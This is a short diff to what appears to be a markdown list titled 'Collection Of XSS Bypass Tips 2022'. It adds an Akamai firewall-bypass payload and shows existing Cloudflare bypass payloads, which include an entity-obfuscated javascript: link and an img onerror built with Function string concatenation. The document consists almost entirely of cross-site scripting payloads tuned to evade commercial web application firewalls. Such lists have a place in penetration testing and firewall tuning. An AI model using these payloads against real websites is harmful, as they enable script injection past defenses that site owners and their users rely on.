@@ -2,6 +2,7 @@
 
 # Collection Of XSS Bypass Tips 2022
 
+Akamai XSS Bypass:  “><svg/on</script>laod=alert>
 
 Cloudflare XSS Bypass: <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
                       :<img src=x onerror='Function("al" + /**/ "ert(1)")()'>
